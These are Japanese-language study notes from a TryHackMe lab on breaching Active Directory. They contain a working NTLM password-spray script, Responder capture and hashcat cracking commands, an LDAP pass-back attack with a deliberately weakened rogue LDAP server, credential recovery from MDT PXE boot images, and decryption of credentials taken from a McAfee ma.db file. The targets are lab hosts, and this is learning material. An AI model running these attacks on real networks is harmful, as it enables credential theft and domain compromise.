# AD 侵入

## NetNTLM

### パスワードスプレー攻撃の例

（出展）https://tryhackme.com/r/room/breachingad

```shell
$ python3 ntlm_passwordspray.py -u usernames.txt -f za.tryhackme.com -p Changeme123 -a http://ntlmauth.za.tryhackme.com/
```

```python
#!/usr/bin/python3

import requests
from requests_ntlm import HttpNtlmAuth
import sys, getopt

class NTLMSprayer:
    def __init__(self, fqdn):
        self.HTTP_AUTH_FAILED_CODE = 401
        self.HTTP_AUTH_SUCCEED_CODE = 200
        self.verbose = True
        self.fqdn = fqdn

    def load_users(self, userfile):
        self.users = []
        lines = open(userfile, 'r').readlines()
        for line in lines:
            self.users.append(line.replace("\r", "").replace("\n", ""))

    def password_spray(self, password, url):
        print ("[*] Starting passwords spray attack using the following password: " + password)
        count = 0
        for user in self.users:
            response = requests.get(url, auth=HttpNtlmAuth(self.fqdn + "\\" + user, password))
            if (response.status_code == self.HTTP_AUTH_SUCCEED_CODE):
                print ("[+] Valid credential pair found! Username: " + user + " Password: " + password)
                count += 1
                continue
            if (self.verbose):
                if (response.status_code == self.HTTP_AUTH_FAILED_CODE):
                    print ("[-] Failed login with Username: " + user)
        print ("[*] Password spray attack completed, " + str(count) + " valid credential pairs found")

def main(argv):
    userfile = ''
    fqdn = ''
    password = ''
    attackurl = ''

    try:
        opts, args = getopt.getopt(argv, "hu:f:p:a:", ["userfile=", "fqdn=", "password=", "attackurl="])
    except getopt.GetoptError:
        print ("ntlm_passwordspray.py -u <userfile> -f <fqdn> -p <password> -a <attackurl>")
        sys.exit(2)

    for opt, arg in opts:
        if opt == '-h':
            print ("ntlm_passwordspray.py -u <userfile> -f <fqdn> -p <password> -a <attackurl>")
            sys.exit()
        elif opt in ("-u", "--userfile"):
            userfile = str(arg)
        elif opt in ("-f", "--fqdn"):
            fqdn = str(arg)
        elif opt in ("-p", "--password"):
            password = str(arg)
        elif opt in ("-a", "--attackurl"):
            attackurl = str(arg)

    if (len(userfile) > 0 and len(fqdn) > 0 and len(password) > 0 and len(attackurl) > 0):
        #Start attack
        sprayer = NTLMSprayer(fqdn)
        sprayer.load_users(userfile)
        sprayer.password_spray(password, attackurl)
        sys.exit()
    else:
        print ("ntlm_passwordspray.py -u <userfile> -f <fqdn> -p <password> -a <attackurl>")
        sys.exit(2)



if __name__ == "__main__":
    main(sys.argv[1:])

```

### NetNTLM チャレンジの傍受

この操作は、通常のネットワーク試行が失敗するようになり混乱を引き起こす（意図したホストや共有に接続できなくなる）ため、使用には注意が必要。

Responder https://github.com/lgandx/Responder

NIC を指定して傍受を開始

```shell
sudo responder -I <network-if>
```

NTLMv2-SSP ハッシュのクラック

```shell
hashcat -m 5600 <hash file> <password file> --force
```

## LDAP

### LDAP パスバック攻撃

プリンターなどの Web インターフェースで、LDAP サーバーの IP アドレスを自分の IP アドレスに変更できる場合などを想定。LDAP サーバーへ送信される認証情報を盗む。通常は暗号化されるので、認証メカニズムをダウングレードした LDAP サーバーを用意する。

#### 不正 LDAP サーバーのホスティング

インストール

```shell
sudo apt-get -y install slapd ldap-utils && sudo systemctl enable slapd
```

サーバー構成

```shell
# No を選択
sudo dpkg-reconfigure -p low slapd
```

- ドメイン名
- 組織名（ドメイン名と同じで可）
- 管理者パスワード
- データベースが消去時に削除されないように、No
- 新しい DB ファイルを作成する前に、古い DB ファイルを移動する、Yes

サポート認証メカニズムをダウングレードして脆弱にするパッチ

```text
#olcSaslSecProps.ldif
dn: cn=config
replace: olcSaslSecProps
olcSaslSecProps: noanonymous,minssf=0,passcred
```

パッチ適用

```shell
sudo ldapmodify -Y EXTERNAL -H ldapi:// -f ./olcSaslSecProps.ldif && sudo service slapd restart
```

確認

```shell
$ ldapsearch -H ldap:// -x -LLL -s base -b "" supportedSASLMechanisms
dn:
supportedSASLMechanisms: LOGIN
supportedSASLMechanisms: PLAIN
```

LDAP サーバーへのリクエストを傍受

```shell
$ sudo tcpdump -SX -i breachad tcp port 389
```

## Microsoft Deployment Toolkit (MDT)

### PXE ブートイメージ

ブートイメージの取得  
https://github.com/wavestone-cdt/powerpxe

通常、MDT サーバーの IP と、BCD ファイル名は DHCP サーバーから取得する。

```ps
# BCDファイルの取得
tftp -i 10.200.55.202 GET "\Tmp\x64{7111EBDE-3818-4BF2-834B-56787204088C}.bcd" conf.bcd

powershell -executionpolicy bypass

# BCDファイルからブートイメージのパスを取得
Import-Module .\PowerPXE.ps1
$BCDFile = "conf.bcd"
Get-WimFile -bcdFile $BCDFile
>>>> Identify wim file : \Boot\x64\Images\LiteTouchPE_x64.wim
\Boot\x64\Images\LiteTouchPE_x64.wim

# ブートイメージの取得
tftp -i 10.200.55.202 GET \Boot\x64\Images\LiteTouchPE_x64.wim pxeboot.wim
```

PXE ブート イメージから資格情報を回復

```ps
Get-FindCredentials -WimFile pxeboot.wim

>> Open pxeboot.wim
>>>> Finding Bootstrap.ini
>>>> >>>> DeployRoot = \\THMMDT\MTDBuildLab$
>>>> >>>> UserID = svcMDT
>>>> >>>> UserDomain = ZA
>>>> >>>> UserPassword = PXEBootSecure1@
```

## 構成ファイル

自動化ツール  
https://github.com/GhostPack/Seatbelt

### McAfee Enterprise Endpoint Security

インストール中にオーケストレーターに接続するために使用する資格情報が ma.db ファイルに埋め込まれている。

```ps
# ma.db を kaliにコピー
scp thm@THMJMP1.za.tryhackme.com:C:/ProgramData/McAfee/Agent/DB/ma.db .

# データを閲覧するデータを閲覧する
sqlitebrowser ma.db
```

AGENT_REPOSITORIES テーブル

```text
domain: za.tryhackme.com
auth_user: svcAV
auth_password: jWbTyS7BL1Hj7PkO5Di/QhhYmcGj5cOoZ2OkDTrFXsR/abAFPM9B3Q==
```

McAfee は auth_password を既知のキーで暗号化しているため、ツールで複合可能。

https://github.com/funoverip/mcafee-sitelist-pwd-decryption

```shell
$ python ./mcafee_sitelist_pwd_decrypt.py jWbTyS7BL1Hj7PkO5Di/QhhYmcGj5cOoZ2OkDTrFXsR/abAFPM9B3Q==
Crypted password   : jWbTyS7BL1Hj7PkO5Di/QhhYmcGj5cOoZ2OkDTrFXsR/abAFPM9B3Q==
Decrypted password : MyStrongPassword!
```
